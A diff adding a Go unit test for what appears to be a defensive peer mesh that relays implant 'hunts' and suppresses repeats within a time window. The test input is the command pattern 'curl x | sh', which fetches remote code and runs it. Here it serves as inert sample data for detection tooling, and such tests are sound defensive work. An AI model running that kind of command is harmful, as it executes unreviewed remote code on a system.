@@ -408,3 +408,24 @@ func TestMesh_QueueFullToldOnce(t *testing.T) {
 		t.Fatalf("%d alerts after the queue drained and filled", len(alerts))
 	}
 }
+
+// A hunt seen before the re-hunt window is relayed again: the implant was
+// dropped again and its box hunts it again.
+func TestMesh_RehuntAfterWindow(t *testing.T) {
+	now := time.Date(2026, 11, 10, 12, 0, 0, 0, time.UTC)
+	m := New(Config{Peers: []netip.AddrPort{netip.MustParseAddrPort("192.0.2.2:7443")}})
+	m.now = func() time.Time { return now }
+	q := m.peers[netip.MustParseAddr("192.0.2.2")].hunts
+	r := req("curl x | sh")
+	m.PushHunt(r, netip.Addr{})
+	now = now.Add(time.Minute)
+	m.PushHunt(r, netip.Addr{})
+	if len(q) != 1 {
+		t.Fatalf("within the window: %d", len(q))
+	}
+	now = now.Add(9 * time.Minute)
+	m.PushHunt(r, netip.Addr{})
+	if len(q) != 2 {
+		t.Fatalf("after the window: %d", len(q))
+	}
+}
